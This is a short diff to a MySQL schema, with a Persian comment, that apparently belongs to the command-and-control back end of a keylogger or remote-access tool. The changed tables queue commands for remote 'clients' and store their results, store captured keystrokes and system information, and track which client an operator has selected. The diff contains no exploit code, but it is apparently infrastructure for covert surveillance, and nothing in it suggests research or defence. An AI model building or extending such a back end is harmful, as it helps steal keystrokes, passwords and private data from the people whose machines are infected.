@@ -35,14 +35,17 @@ CREATE TABLE IF NOT EXISTS clients (
 
 CREATE TABLE IF NOT EXISTS client_commands (
     id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
-    client_id VARCHAR(32) NOT NULL,
+    client_id CHAR(32) NOT NULL,
     command TEXT NOT NULL,
     status ENUM('pending', 'completed', 'failed') DEFAULT 'pending',
-    created_at DATETIME NOT NULL,
+    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
+    updated_at DATETIME,
     completed_at DATETIME,
-    result TEXT,
-    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE
+    result MEDIUMTEXT, -- تغییر از TEXT به MEDIUMTEXT
+    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
+    INDEX idx_client_status (client_id, status)
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
+
 
 CREATE TABLE IF NOT EXISTS user_data (
     id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
@@ -53,6 +56,13 @@ CREATE TABLE IF NOT EXISTS user_data (
     created_at DATETIME NOT NULL,
     FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
     INDEX idx_client_id (client_id)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
+
+CREATE TABLE user_selections (
+    user_id BIGINT NOT NULL,
+    selected_client VARCHAR(255) NOT NULL,
+    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+    PRIMARY KEY (user_id)
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
 
 ALTER TABLE user_data MODIFY keystrokes MEDIUMTEXT, MODIFY system_info MEDIUMTEXT;
